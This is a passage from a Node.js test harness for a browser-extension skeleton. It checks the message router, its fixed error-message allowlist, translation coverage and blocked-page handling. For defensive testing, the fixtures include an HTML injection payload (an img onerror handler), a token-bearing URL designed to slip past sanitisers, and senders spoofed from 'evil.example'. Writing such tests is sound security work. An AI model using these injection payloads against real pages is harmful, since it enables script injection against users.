#!/usr/bin/env node
/* SKELETON pure/controller sim (no browser). Loads the REAL shipped files —
   background.js, lib/settings.js, lib/storage.js, pages/common.js,
   pages/options.js, popup/popup.js — through test/harness.js and grades them.

   Nothing here is a re-implementation. Every function under test is the one the
   browser runs; only what it TALKS TO (chrome, IndexedDB, the DOM) is fake, and
   every one of those fakes records what it was asked to do.

   Run:      node test/skeleton-sim.node.js
   Exit 0 = ALL PASS, exit 1 = FAILURES.

   Sections, and what each is for:
     router      the message router answers, and only in its own vocabulary
     reasons     the ALLOWLIST error path: a closed set of sentences, no regex
     canonical   no untrusted input carries a path, a query or an APOSTROPHE
                 into anything that is stored or shown. THIS is the section that
                 exists because the family paid for it three times.
     settings    defaults, the privacy-shaped default, migrations, live changes
     jobs        every abandonment drops its scratch — nothing survives that the
                 user cannot see or delete
     render      untrusted text reaches the DOM as TEXT, never as markup
     i18n        the real pass, RUN, against the real _locales files: a grep
                 proves a key is spelled, never that a string reached a screen
     sink        static: no controller builds markup by concatenation, the two
                 gates are still gates, and the cross-file constants still match
     network     static + runtime: zero network calls in shipped code
     manifest    minimum permissions, and every referenced file exists

   THIS FILE IS NOT SHIPPED.
*/
'use strict';

const path = require('path');
const H = require(path.join(__dirname, 'harness.js'));
const { check, runSection, note, finish, tick, sleep } = H;

/* ---------------------------------------------------------------- */
/* fixtures                                                          */
/* ---------------------------------------------------------------- */

const SECRET = 'SECRET123';

/* The exact shape that beat two regex sanitisers in this family: a url with a
   PATH, a QUERY carrying a token, a FRAGMENT, and an APOSTROPHE in the path.
   Chrome does not percent-encode an apostrophe, so the character class the old
   sanitiser used to FIND a url ended its match right there and left everything
   after it — token and all — in the sentence. */
const HOSTILE_URL = "https://bank.example/it's/statement?token=" + SECRET + "&user=ada#frag'";
const HOSTILE_MSG = 'Failed to fetch ' + HOSTILE_URL;

/* A page title is page-controlled text. It is the single most-attacked value in
   this family, because it is rendered by every tool. */
const HOSTILE_TITLE = '<img src=x onerror="document.title=String.fromCharCode(80,87,78,69,68)">';

const DB_NAME = (/const\s+DB_NAME\s*=\s*'([^']+)'/.exec(H.readRoot('lib/storage.js')) || [, 'skeleton'])[1];

function boot(extra) {
  const chrome = H.makeChrome(Object.assign({
    tabs: [
      { id: 1, windowId: 1, active: true, title: 'Ordinary Page', url: 'https://example.com/a/b?q=1' },
      { id: 2, windowId: 1, active: false, title: 'Settings', url: 'chrome://settings/privacy' },
      { id: 3, windowId: 1, active: false, title: '   ', url: 'https://blank.example/' },
      { id: 4, windowId: 1, active: false, title: 'Store', url: 'https://chromewebstore.google.com/detail/x' },
      { id: 5, windowId: 1, active: false, title: 'Src', url: 'view-source:https://example.com/' },
      { id: 6, windowId: 1, active: false, title: 'Self', url: 'chrome-extension://abc/pages/options.html' },
      { id: 7, windowId: 2, active: false, title: 'Bank', url: HOSTILE_URL },
      /* The pages that are blocked and DO NOT LOOK BLOCKED, plus the ones the
         reference's three divergent lists all missed. Every one of them is a
         page a user is more likely to be on when something has gone wrong, and
         each answers with its own sentence rather than the generic refusal.
         They live in the shared fixture so all 67 tools inherit the coverage. */
      { id: 10, windowId: 1, active: false, title: 'Local', url: 'file:///C:/Users/ada/report.html' },
      { id: 11, windowId: 1, active: false, title: 'Privacy error', url: 'chrome-error://chromewebdata/' },
      { id: 12, windowId: 1, active: false, title: 'Internal', url: 'chrome-untrusted://print/' },
      { id: 13, windowId: 1, active: false, title: 'Statement', url: 'https://bank.example/2026/statement.pdf?download=1' },
      { id: 14, windowId: 1, active: false, title: 'Add-ons', url: 'https://addons.mozilla.org/en-GB/firefox/addon/x/' },
      { id: 15, windowId: 1, active: false, title: 'Frame', url: 'about:srcdoc' },
      { id: 16, windowId: 1, active: false, title: 'Inline', url: 'data:text/html,<p>hi</p>' },
      /* An ordinary https page whose ORIGIN is opaque — a sandboxed frame. The
         url alone says nothing is wrong; tab.origin is the only signal. */
      { id: 17, windowId: 1, active: false, title: 'Sandboxed', url: 'https://cdn.example/embed', origin: 'null' },
      /* A PRIVATE WINDOW. An ordinary https page in every respect except the
         one flag, which is the point: nothing about the url says "do not keep
         this". manifest.json declares "incognito": "spanning", so this tab
         shares ONE worker, ONE IndexedDB and ONE settings store with every
         normal window — and a tool that does not check the flag writes private
         page content into the same listed, on-disk store as everything else,
         where it outlives the session that was supposed to leave no trace.
         It lives in the shared fixture so all 67 tools inherit the check. */
      { id: 18, windowId: 6, active: false, incognito: true, title: 'Private Page', url: 'https://private.example/x?t=' + SECRET }
    ]
  }, extra || {}));
  return { chrome, bg: H.loadBackground({ chrome }) };
}

/* A static check that reads comments as code is a check that goes red on the
   paragraph explaining the rule — and the author's rational move is to delete
   the check. Comments are blanked to SPACES rather than removed, so every line
   number and every string offset stays exactly where it was. */
function stripCssComments(css) {
  return String(css).replace(/\/\*[\s\S]*?\*\//g, m => m.replace(/[^\n]/g, ' '));
}
function stripHtmlComments(html) {
  return String(html).replace(/<!--[\s\S]*?-->/g, m => m.replace(/[^\n]/g, ' '));
}

/* ---- THE STRING THAT NEVER REACHED THE CATALOGUE ----------------------
   The i18n investment is 55 catalogues deep, and the cheapest way to lose it
   is not to break it — it is to bypass it. A tool author adds one control,
   types the label straight into the markup, and every check stays green: the
   key-resolution check only grades keys that EXIST, so a label with no key at
   all is invisible to it. The string then ships to all 55 locales in English,
   silently, and nothing in either tier says a word.

   This is the one i18n failure with no natural symptom. A missing key renders
   the ⟦missing-key⟧ marker and someone sees it; a dropped catalogue is refused
   at package time. A hardcoded string just quietly works in one language.

   What counts as a violation: visible text that is not inside a [data-i18n]
   subtree (that subtree's content is replaced at runtime, so the English in
   the file is only a fallback) and that contains a LETTER in some script.
   Letter-free text — ◐ ↻ ✕ · — is a glyph, not a sentence: it is identical in
   every locale, and the accessible NAME of a glyph button is separately
   required to be a key by the accessible-name check. Deliberately consistent
   with LOCKED RULE 1: version strings and other functional output carry no
   letters either, and must not be translated. */
/* ---- WHICH WORLD IS THIS TREE IN? ------------------------------------
   The skeleton and a tool copied from it are graded differently on a handful
   of questions, and every one of those questions must read the SAME signal or
   they will contradict each other. `publish/identity.json`'s slug is that
   signal: it is the first thing TEMPLATE §1 tells you to change, and it cannot
   be changed by accident.

   The rule for using it: a check may assert the skeleton-side invariant
   strictly, but on a TOOL it must only assert things that are true throughout
   specialisation — not things that are true when specialisation is FINISHED.
   "Am I finished?" is publish/preflight.mjs, which is red by design. The sim
   is green at all times, so anything it demands of a tool is demanded on that
   tool's first afternoon as well as its last. Getting this backwards is what
   teaches 67 authors that a red is negotiable. */
function isSkeletonTree() {
  try { return String(JSON.parse(H.readRoot('publish/identity.json')).slug || '') === 'skeleton'; }
  catch (_) { return false; }
}

const HAS_LETTER = /\p{L}/u;

/* A JavaScript string LITERAL, in all three spellings. Used by the sink checks
   in `=== a11y ===` and `=== i18n ===`, which is why it lives out here rather
   than in either of them.
   An earlier version of those checks matched '…' only, and the identical bug
   written skToast("Nothing was saved.") walked past in silence. Nothing in this
   family enforces a quote style and 67 tool authors will not all pick the same
   one, so a single-quote pattern grades part of the fleet and certifies the
   rest. A template literal containing ${…} is a concatenation rather than a
   bare sentence, so `$` excludes itself and the concatenation ban — a separate
   check — keeps sole custody of that case. Three alternatives, so a match
   yields three capture groups of which exactly one is defined: litAt() picks it. */
const JS_STR = '(?:\'([^\'\\\\]*)\'|"([^"\\\\]*)"|`([^`\\\\$]*)`)';
const litAt = (m, i) => (m[i] !== undefined ? m[i] : m[i + 1] !== undefined ? m[i + 1] : m[i + 2]);

const RAW_TEXT_TAGS = /<(script|style)\b[\s\S]*?<\/\1\s*>/gi;
const VOID_HTML = new Set(['area', 'base', 'br', 'col', 'embed', 'hr', 'img', 'input',
  'link', 'meta', 'param', 'source', 'track', 'wbr']);

function hardcodedPageText(html) {
  /* Comments and <script>/<style> bodies are not visible text. The doctype is
     not an element and must not be read as one. */
  const h = stripHtmlComments(String(html))
    .replace(RAW_TEXT_TAGS, '')
    .replace(/<!doctype[^>]*>/gi, '');
  const found = [];
  const stack = [];              // open elements, innermost last
  let suppress = 0;              // depth of [data-i18n] subtrees we are inside
  const re = /<(\/?)([a-zA-Z][\w-]*)\b([^>]*?)(\/?)>/g;
  let last = 0, m;
  const emit = (text) => {
    if (suppress > 0) return;
    const t = text.replace(/\s+/g, ' ').trim();
    if (t && HAS_LETTER.test(t)) found.push(t);
  };
  while ((m = re.exec(h))) {
    emit(h.slice(last, m.index));
    last = re.lastIndex;
    const tag = m[2].toLowerCase();
    if (m[1] === '/') {
      /* Close the nearest matching open tag, discarding anything left unclosed
         inside it, so one stray <br> cannot desynchronise the whole walk. */
      for (let i = stack.length - 1; i >= 0; i--) {
        if (stack[i].tag !== tag) continue;
        for (const gone of stack.splice(i)) if (gone.sup) suppress--;
        break;
      }
    } else if (m[4] !== '/' && !VOID_HTML.has(tag)) {
      const sup = /\sdata-i18n\s*=/.test(' ' + m[3]);
      stack.push({ tag, sup });
      if (sup) suppress++;
    }
  }
  emit(h.slice(last));
  return found;
}

/* The other half: a string can also be visible as an ATTRIBUTE. title=,
   aria-label= and placeholder= are read aloud or shown on hover, and alt= is
   the whole content of an image to a screen reader. Each needs its counterpart
   in that element's data-i18n-attr list — skApplyI18n fills attributes from
   that attribute and from nothing else. An EMPTY alt is the correct answer for
   a decorative image and is not a string at all. */
const I18N_VISIBLE_ATTRS = ['title', 'aria-label', 'placeholder', 'alt'];

/* "title:popupRefresh; aria-label:popupRefresh" -> Map { title -> key, … }.
   The SAME parse skApplyI18n does, deliberately: a check that reads the spec
   its own way is a check that grades a different language than the one the
   browser runs. Names are lower-cased on both sides; a pair with no ':' keeps
   an empty key, which is a defect the caller reports rather than skips. */
function parseI18nAttrSpec(spec) {
  const out = new Map();
  for (const pair of String(spec == null ? '' : spec).split(';')) {
    if (!pair.trim()) continue;
    const cut = pair.indexOf(':');
    const name = (cut < 0 ? pair : pair.slice(0, cut)).trim().toLowerCase();
    out.set(name, cut < 0 ? '' : pair.slice(cut + 1).trim());
  }
  return out;
}

function hardcodedPageAttrs(html) {
  const h = stripHtmlComments(String(html)).replace(RAW_TEXT_TAGS, '');
  const out = [];
  const re = /<([a-zA-Z][\w-]*)\b([^>]*?)\/?>/g;
  let m;
  while ((m = re.exec(h))) {
    const attrs = H.parseAttrs(m[2]);
    const spec = parseI18nAttrSpec(attrs.get('data-i18n-attr'));
    for (const attr of I18N_VISIBLE_ATTRS) {
      const v = attrs.get(attr);
      if (!v || !HAS_LETTER.test(v)) continue;
      if (!spec.get(attr)) out.push(m[1] + ' ' + attr + '="' + v + '"');
    }
  }
  return out;
}

/* THE SAME PROBLEM, IN JAVASCRIPT, AND IT BITES HARDER HERE.

   This family's shipped files carry long comments that quote the very APIs the
   checks are looking for — "navigator.storage.persist() is Window-only",
   "no fetch, no XHR". A scan over raw source therefore reports the paragraph
   explaining the rule as a violation of it, and the author's rational response
   to a check that is red on correct code is to delete the check.

   Strings are tracked so an https:// inside a quoted url is not mistaken for a
   line comment, and comments are blanked to SPACES so every line number and
   column stays exactly where it was. Regex literals are not parsed: in this
   codebase every '/' inside one is backslash-escaped, so no two of them are
   ever adjacent, and the conservative reading costs nothing. */
function stripJsComments(src) {
  const s = String(src);
  let out = '';
  let i = 0;
  while (i < s.length) {
    const c = s[i], d = s[i + 1];
    if (c === '/' && d === '/') {
      while (i < s.length && s[i] !== '\n') { out += ' '; i++; }
      continue;
    }
    if (c === '/' && d === '*') {
      while (i < s.length && !(s[i] === '*' && s[i + 1] === '/')) { out += (s[i] === '\n' ? '\n' : ' '); i++; }
      out += '  '; i += 2;
      continue;
    }
    if (c === '"' || c === "'" || c === '`') {
      const quote = c;
      out += c; i++;
      while (i < s.length) {
        if (s[i] === '\\') { out += s[i] + (s[i + 1] || ''); i += 2; continue; }
        out += s[i];
        if (s[i] === quote) { i++; break; }
        i++;
      }
      continue;
    }
    out += c; i++;
  }
  return out;
}

/* scanSource, but over code only. */
function scanCode(re, exts) {
  const hits = [];
  for (const [rel, src] of H.readShipped(exts || ['.js'])) {
    const lines = stripJsComments(src).split(/\r?\n/);
    for (let i = 0; i < lines.length; i++) {
      const r = new RegExp(re.source, re.flags.replace('g', ''));
      if (r.test(lines[i])) hits.push(rel + ':' + (i + 1) + '  ' + lines[i].trim().slice(0, 120));
    }
  }
  return hits;
}

/* Every stylesheet the browser loads: the .css files plus the <style> block
   inside every page, discovered rather than listed, comments blanked. */
function shippedStylesheets(keepComments) {
  const out = new Map();
  const clean = s => (keepComments ? s : stripCssComments(s));
  for (const [name, text] of H.readShipped(['.css'])) out.set(name, clean(text));
  for (const [name, text] of H.readShipped(['.html'])) {
    const re = /<style[^>]*>([\s\S]*?)<\/style>/gi;
    let m, i = 0;
    while ((m = re.exec(keepComments ? text : stripHtmlComments(text)))) {
      out.set(name + ' <style ' + (++i) + '>', clean(m[1]));
    }
  }
  return out;
}

function scratchCount(bg) { return bg.idb.indexedDB.__count(DB_NAME, 'scratch'); }
function itemCount(bg) { return bg.idb.indexedDB.__count(DB_NAME, 'items'); }

/* The packaging tier's own modules, loaded rather than re-implemented. PUB is
   CommonJS; PACK and BUMP are ESM, so they arrive through a dynamic import()
   inside main(). Everything the === publish === section asserts is asserted
   against the functions publish/pack.mjs actually runs. */
const fs = require('fs');
const PUB = require(path.join(H.ROOT, 'publish', 'verify-package.node.js'));
let PACK = null, BUMP = null;

(async function main() {
  const toUrl = rel => require('url').pathToFileURL(path.join(H.ROOT, rel)).href;
  PACK = await import(toUrl('publish/pack.mjs'));
  BUMP = await import(toUrl('publish/bump-version.mjs'));

  await runSection('router', async () => {
    const { chrome, bg } = boot();

    check('the worker registers exactly one onMessage listener',
      chrome.__listeners['runtime.onMessage'].length === 1,
      chrome.__listeners['runtime.onMessage'].length + ' listener(s)');

    check('the worker importScripts the three shared libraries, in order',
      bg.imported.join(',') === 'lib/settings.js,lib/storage.js,lib/jobs.js', bg.imported.join(','));

    const ok = await bg.send({ type: 'SK_TAB_INFO', tabId: 1, action: 'read-title' });
    check('SK_TAB_INFO answers with the real tab title',
      ok.ok === true && ok.title === 'Ordinary Page', JSON.stringify(ok));
    check('the answer carries the ORIGIN, never the path or the query',
      ok.origin === 'https://example.com', ok.origin);
    check('the router returned true so sendResponse may be async',
      chrome.__routerReturns.every(r => r === true), JSON.stringify(chrome.__routerReturns));

    /* The worker answers with a message KEY, never prose — it holds no
       sentences at all (see the note above R_GENERIC in background.js). Each
       check below asserts BOTH halves: the right key came back, and that key
       resolves to a real sentence in the default catalogue. The second half is
       the one that matters: without it a typo ships as the literal text
       "reasonRestricted" in the popup's error panel, which is exactly what a
       browser run showed before this check existed. */
    const EN = JSON.parse(H.readRoot('_locales/en/messages.json'));
    const says = key => (EN[key] && EN[key].message) || '';
    const resolves = key => typeof key === 'string' && !!says(key);

    const blocked = await bg.send({ type: 'SK_TAB_INFO', tabId: 2 });
    check('a browser page is refused with the browser-pages key, and it resolves',
      blocked.ok === false && blocked.error === 'reasonBrowserPage' && resolves(blocked.error),
      blocked.error + ' -> ' + says(blocked.error).slice(0, 48) + '…');

    const vs = await bg.send({ type: 'SK_TAB_INFO', tabId: 5 });
    check('view-source gets its OWN key, not the generic one',
      vs.error === 'reasonViewSource' && resolves(vs.error), vs.error + ' -> ' + says(vs.error));

    const store = await bg.send({ type: 'SK_TAB_INFO', tabId: 4 });
    check('the web store gets its own key',
      store.error === 'reasonWebStore' && resolves(store.error), store.error + ' -> ' + says(store.error));

    const self = await bg.send({ type: 'SK_TAB_INFO', tabId: 6 });
    check('an extension page is refused with the extension-page key',
      self.error === 'reasonExtensionPage' && resolves(self.error), self.error + ' -> ' + says(self.error));

    /* ---- the tag that decides which sentences get checked at all ----
       Every sentence blockReason() can return says the same thing: the BROWSER
       or the SITE forbids this, to EVERY extension, and this tool is not
       broken. Lose the negation in translation and each one inverts into a
       defect report about the product, in a language nobody on the team reads.

       `[permission]` in the English description is the ONLY thing that puts a
       string into make-locales.mjs's back-translation negation gate. So an
       untagged member of this family is not a cosmetic inconsistency — it is a
       string silently exempted from the one check that would catch the
       inversion, and nothing else in either tier would ever mention it.

       The family is read from background.js rather than listed here, because a
       list here would be the second copy and the second copy is what goes
       stale. blockReason() is the single entry point by construction, so
       adding a row to RESTRICTED_REASONS puts the new key under this check
       automatically — which is the point: the author who adds the row is the
       one who has to write the tag. */
    const bgSrc = H.readRoot('background.js');
    const family = new Set();
    const table = /const RESTRICTED_REASONS = \[([\s\S]*?)\n\];/.exec(bgSrc);
    for (const m of (table ? table[1] : '').matchAll(/'(reason[A-Za-z]+)'/g)) family.add(m[1]);
    const generic = /const GENERIC_RESTRICTED = '(reason[A-Za-z]+)'/.exec(bgSrc);
    if (generic) family.add(generic[1]);
    const sniffed = /function blockReason\(tab\) \{([\s\S]*?)\n\}/.exec(bgSrc);
    for (const m of (sniffed ? sniffed[1] : '').matchAll(/return '(reason[A-Za-z]+)'/g)) family.add(m[1]);

    check('the blocked-page family was actually found in background.js — an empty set would pass the next check vacuously',
      family.size >= 10, family.size + ' keys: ' + [...family].join(' '));
    const untagged = [...family].filter(k => !/^\[permission\]/.test(String((EN[k] || {}).description || '')));
    check('every blocked-page sentence the worker can return is tagged [permission] in _locales/en',
      untagged.length === 0,
      untagged.join(', ') || 'all ' + family.size + ' are in the back-translation negation gate');

    const empty = await bg.send({ type: 'SK_TAB_INFO', tabId: 3 });
    check('a whitespace-only title is refused, not answered with ""',
      empty.ok === false && empty.error === 'reasonNoTitle' && resolves(empty.error), empty.error);

    const weird = 'SK_' + HOSTILE_TITLE;
    const unknown = await bg.send({ type: weird });
    check('an unknown message answers with the fixed unknown-message key',
      unknown.ok === false && unknown.error === 'reasonUnknownMessage' && resolves(unknown.error), unknown.error);
    check('the unknown type is NOT echoed back to the caller',
      JSON.stringify(unknown).indexOf('img src') < 0, JSON.stringify(unknown));
    check('the unknown type IS named in the developer log',
      bg.logText().indexOf(weird) >= 0, 'console.error carries it, the answer does not');

    /* The router's catch, holding an engine string that carries a token. This
       is GATE 2 doing its job: whatever comes out of the engine, what goes on
       the wire is a key this file declared. */
    chrome.__failOnce('tabs.get', new Error(HOSTILE_MSG));
    const thrown = await bg.send({ type: 'SK_TAB_INFO', tabId: 1, action: 'read-title' });
    check('an engine failure answers with the generic key',
      thrown.ok === false && thrown.error === 'reasonGeneric' && resolves(thrown.error), thrown.error);
    check('the token in the engine string never reaches the caller',
      JSON.stringify(thrown).indexOf(SECRET) < 0, JSON.stringify(thrown));
    check('the raw engine string DID reach console.error (local, never stored)',
      bg.logText().indexOf(SECRET) >= 0, 'developer sees it, user does not');

    const gone = await bg.send({ type: 'SK_TAB_INFO', tabId: 999 });
    check('a missing tab answers a declared sentence, never the engine wording',
      gone.ok === false && gone.error.indexOf('999') < 0, gone.error);

    const cancel = await bg.send({ type: 'SK_JOB_CANCEL', tabId: 1 });
    check('SK_JOB_CANCEL always answers ok', cancel && cancel.ok === true, JSON.stringify(cancel));

    const wipe = await bg.send({ type: 'SK_CLEAR_DATA' });
    check('SK_CLEAR_DATA answers ok', wipe && wipe.ok === true, JSON.stringify(wipe));

    check('the router set a badge for the failures and cleared it for success',
      chrome.__callsOf('action.setBadgeText').length > 0,
      chrome.__callsOf('action.setBadgeText').map(c => JSON.stringify(c.args[0].text)).join(' '));

    /* ---- WHO IS ALLOWED TO TALK TO THIS ROUTER ----

       Safe today only by accident of what the skeleton does not yet do: no
       externally_connectable, no content script, so nothing but our own pages
       can reach onMessage. Both change the first time a tool follows §8 and
       injects one — and the ordinary in-page-overlay pattern is a
       window.postMessage bridge, at which point the PAGE picks msg.type and
       msg.tabId. Add the optional <all_urls> grant the same table offers and
       msg.tabId is a caller-driven cross-tab read.

       It fails closed under activeTab-only, which is exactly why nobody would
       notice it was missing until after a tool had broad host access. */
    const before = itemCount(bg) + scratchCount(bg);
    const foreign = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 },
      { id: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', url: 'https://evil.example/x' });
    check('a message from ANOTHER EXTENSION is refused',
      foreign === undefined, JSON.stringify(foreign));
    check('and it is refused WITHOUT AN ANSWER — a refusal that answers is a probe that succeeded',
      chrome.__routerReturns[chrome.__routerReturns.length - 1] === false,
      'the listener returned false, so the channel closed');
    check('nothing ran for it: no job, no scratch row, no stored row',
      itemCount(bg) + scratchCount(bg) === before, 'stores unchanged');

    const spoofedPage = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 },
      { id: chrome.runtime.id, url: 'https://evil.example/pretending-to-be-a-page' });
    check('an extension-page sender whose url is NOT ours is refused too',
      spoofedPage === undefined, JSON.stringify(spoofedPage));

    const ours = await bg.send({ type: 'SK_TAB_INFO', tabId: 1 }, chrome.__ownSender());
    check('our own options page is still served, so the gate is not simply refusing everything',
      ours && ours.ok === true, JSON.stringify(ours && ours.error || 'ok'));

    /* THE CROSS-TAB READ, closed. A content script's sender carries a tab, and
       from then on the tab is DERIVED and msg.tabId is ignored — so a page that
       has smuggled a message through a relay cannot nominate a tab it has
       nothing to do with. */
    const relayed = await bg.send({ type: 'SK_TAB_INFO', tabId: 6 },
      { id: chrome.runtime.id, url: 'https://ordinary.example/a', tab: { id: 1, windowId: 1 } });
    check('a content-script sender gets the tab it is IN, never the tab it asked for',
      relayed && relayed.ok === true && relayed.origin === 'https://example.com',
      'asked for tab 6 (' + (chrome.__tabs.get(6) || {}).url + '), got ' + (relayed && relayed.origin));
    check('the tab is derived by ONE function, so a new case cannot forget',
      /function tabIdFor\s*\(/.test(H.readRoot('background.js')) &&
      !/msg\.tabId\s*!=\s*null\s*\?\s*msg\.tabId\s*:\s*\(sender/.test(H.readRoot('background.js')),
      'tabIdFor(msg, sender)');
  });

  await runSection('reasons', async () => {
    const { bg } = boot();
    const humanReason = bg.sandbox.humanReason;
    const wireReason = bg.sandbox.wireReason;
    const GENERIC = bg.eval('R_GENERIC');
    const ROWS = bg.eval('REASONS.map(r => [r[0], r[1]])');

    check('the reasons table is a table of fixed strings',
      ROWS.length >= 7 && ROWS.every(r => typeof r[0] === 'string' && typeof r[1] === 'string'),
      ROWS.length + ' rows');

    let allRows = true, rowDetail = '';
    for (const [wire, human] of ROWS) {
      if (humanReason(wire) !== human) { allRows = false; rowDetail = wire; break; }
    }
    check('every declared wire string maps to its declared sentence', allRows, rowDetail || ROWS.length + '/' + ROWS.length);

    let idem = true;
    for (const [wire, human] of ROWS) {
      if (humanReason(human) !== human || wireReason(human) !== human) { idem = false; rowDetail = human; break; }
    }
    check('a sentence that has been through a gate survives a second pass', idem, rowDetail || 'idempotent');

    check('an unrecognised string becomes the generic sentence',
      humanReason(HOSTILE_MSG) === GENERIC, humanReason(HOSTILE_MSG));
    check('the generic sentence is not a substring of what was handed in',
      HOSTILE_MSG.indexOf(humanReason(HOSTILE_MSG)) < 0, 'nothing is carried out');

    check('null becomes the generic sentence', humanReason(null) === GENERIC, humanReason(null));
    check('undefined becomes the generic sentence', humanReason(undefined) === GENERIC, humanReason(undefined));
    check('the empty string becomes the generic sentence', humanReason('') === GENERIC, humanReason(''));
    check('a number becomes the generic sentence', humanReason(404) === GENERIC, humanReason(404));

    let toStringRan = false;
    const foreign = { toString() { toStringRan = true; return 'PWNED'; } };
    const foreignOut = humanReason(foreign);
    check('a foreign object cannot make the gate return its own text',
      foreignOut === GENERIC && foreignOut !== 'PWNED', foreignOut + (toStringRan ? '  (its toString ran, and was still discarded)' : ''));

    /* The property that makes this an ALLOWLIST rather than a filter: the set of
       possible OUTPUTS is closed, whatever the input. A sanitiser can only ever
       promise "less bad"; this promises "one of these". */
    const allowed = new Set(ROWS.map(r => r[1]).concat([GENERIC]));
    const FUZZ = [];
    const parts = ['', 'https://', 'bank.example', '/path', "it's", '?token=' + SECRET, '#f', '<script>',
      ' ', '\t', String.fromCharCode(0), 'Error: ', 'Failed to fetch ', 'No tab with id: 42.', 'This tab is already busy.',
      '\\', '"', '`', '%27', 'chrome://settings'];
    for (let i = 0; i < 400; i++) {
      let s = '';
      const n = 1 + (i % 5);
      for (let j = 0; j < n; j++) s += parts[(i * 7 + j * 13) % parts.length];
      FUZZ.push(s);
    }
    FUZZ.push(null, undefined, 0, false, [], {}, foreign, new Error(HOSTILE_MSG));
    let escaped = null;
    for (const f of FUZZ) {
      const h = humanReason(f), w = wireReason(f);
      if (!allowed.has(h) || !allowed.has(w)) { escaped = String(f).slice(0, 60); break; }
    }
    check('over ' + FUZZ.length + ' hostile inputs, both gates return ONLY declared sentences',
      escaped === null, escaped === null ? allowed.size + ' possible outputs, all declared' : 'escaped: ' + escaped);

    let leaked = null;
    for (const f of FUZZ) {
      const h = humanReason(f);
      if (h.indexOf(SECRET) >= 0 || h.indexOf('bank.example') >= 0 || h.indexOf('<') >= 0) { leaked = h; break; }
    }
    check('no output ever contains a token, a host or an angle bracket', leaked === null, leaked || 'clean');

    /* The lookup is EXACT (trim + lowercase), not a prefix match. Worth pinning:
       the example engine row in REASONS reads like a prefix, and a tool author
       who assumes it is one will silently get the generic sentence instead of
       their translation. That direction is safe — it fails CLOSED — but a check
       that states it is cheaper than the afternoon spent discovering it. */
    check('an exact engine string hits its translation row',
      humanReason('No tab with id') === 'reasonTabClosed',
      humanReason('No tab with id'));
    check('a LONGER engine string falls to the generic sentence (exact match, fails closed)',
      humanReason('No tab with id: 999.') === GENERIC, humanReason('No tab with id: 999.'));
    check('case and surrounding whitespace do not defeat the table',
      humanReason('  REASONBUSY  ') === 'reasonBusy',
      humanReason('  REASONBUSY  '));

    check('every restricted-page sentence is itself a recognised reason',
      bg.eval('RESTRICTED_REASONS.every(p => humanReason(p[1]) === p[1])'),
      'the refusal a user sees survives being parked and re-read');
  });

  /* ================================================================== */
  /* restricted — a blocked page is not the user's mistake                */
  /* ================================================================== */
  /* "Not allowed" on its own leaves nowhere to go, and a user who has nowhere
     to go writes a one-star review. Every family of blocked page gets its own
     sentence saying what to do instead, and the two that do NOT LOOK BLOCKED —
     the built-in PDF viewer and a sandboxed document, both serving ordinary
     https urls — get one too, because otherwise the tool simply returns nothing
     from a page that looks completely normal.

     Teeth: delete the file: row from RESTRICTED_REASONS and the file:// check
     goes red with the generic sentence. */
  await runSection('restricted', async () => {
    const { chrome, bg } = boot();
    const says = key => chrome.__i18nCatalogue[key] && chrome.__i18nCatalogue[key].message;

    /* Every row answers with ITS OWN sentence, and every sentence exists. */
    const WANT = [
      [2, 'reasonBrowserPage', 'chrome://settings'],
      [4, 'reasonWebStore', 'the Chrome Web Store'],
      [5, 'reasonViewSource', 'view-source:'],
      [6, 'reasonExtensionPage', 'an extension page'],
      [10, 'reasonFileUrl', 'file:// — the checkbox the user has never seen'],
      [11, 'reasonPageDidNotLoad', 'chrome-error: — an SSL interstitial or a DNS failure'],
      [12, 'reasonBrowserPage', 'chrome-untrusted: internal WebUI'],
      [13, 'reasonPdfViewer', "the browser's built-in PDF viewer"],
      [14, 'reasonAddonStore', 'addons.mozilla.org, for the Firefox build'],
      [15, 'reasonSandboxed', 'about:srcdoc'],
      [16, 'reasonSandboxed', 'a top-level data: document'],
      [17, 'reasonSandboxed', 'an https page with an OPAQUE origin — the url looks fine']
    ];
    const wrong = [];
    for (const [tabId, key, why] of WANT) {
      const r = await bg.send({ type: 'SK_TAB_INFO', tabId });
      if (r.ok !== false || r.error !== key || !says(key)) {
        wrong.push('tab ' + tabId + ' (' + why + ') -> ' + r.error);
      }
    }
    check(WANT.length + ' families of blocked page each answer with their OWN reason, and every reason resolves',
      wrong.length === 0, wrong.join(' | ') || WANT.map(w => w[1]).filter((v, i, a) => a.indexOf(v) === i).join(', '));

    check('nothing was even STARTED for a blocked page — no job, no scratch row',
      bg.sandbox.SKJOBS.size() === 0 && scratchCount(bg) === 0,
      'jobs=' + bg.sandbox.SKJOBS.size() + ' scratch=' + scratchCount(bg));

    /* The two un-obvious ones, as predicates, because that is where a tool will
       extend them. */
    const pdf = bg.sandbox.looksLikePdf;
    check('the PDF predicate ignores the query and the fragment — "?download=1" after .pdf is still the viewer',
      pdf({ url: 'https://a.example/x.pdf' }) && pdf({ url: 'https://a.example/x.pdf?d=1' }) &&
      pdf({ url: 'https://a.example/x.PDF#page=2' }),
      'plain, query and fragment all detected');
    check('and it does not fire on a page that merely MENTIONS pdf',
      !pdf({ url: 'https://a.example/pdf/guide.html' }) &&
      !pdf({ url: 'https://a.example/x.pdf.html' }) &&
      !pdf({ url: 'https://pdf.example/' }),
      'no false positive on a path segment, a double extension or a hostname');
    const sandboxed = bg.sandbox.looksSandboxed;
    check('the sandbox predicate reads the OPAQUE ORIGIN, which is the only signal an https url gives',
      sandboxed({ url: 'https://ok.example/', origin: 'null' }) &&
      !sandboxed({ url: 'https://ok.example/', origin: 'https://ok.example' }) &&
      !sandboxed({ url: 'https://ok.example/' }),
      'origin "null" only');

    /* Single source. The popup holds no copy of this vocabulary — the
       reference had THREE divergent lists inside ONE extension, and none of
       them covered chrome-error: or chrome-untrusted:. */
    const popSrc = H.readRoot('popup/popup.js');
    const optSrc = H.readRoot('pages/options.js');
    const copies = ['chrome-error', 'chrome-untrusted', 'view-source', 'chromewebstore', 'addons.mozilla']
      .filter(s => popSrc.indexOf(s) >= 0 || optSrc.indexOf(s) >= 0);
    check('the blocked-page vocabulary exists in exactly ONE file — no page holds a second copy',
      copies.length === 0, copies.length ? 'a page names: ' + copies.join(',') : 'background.js only');
    check('there is ONE entry point for refusing a tab, so a new case is a row and not a code path',
      /function blockReason\(tab\)/.test(H.readRoot('background.js')) &&
      /const blocked = blockReason\(tab\);/.test(H.readRoot('background.js')),
      'blockReason()');

    /* An ordinary page is still ordinary. A blocked-page list that grows until
       it blocks everything is the other way to fail this. */
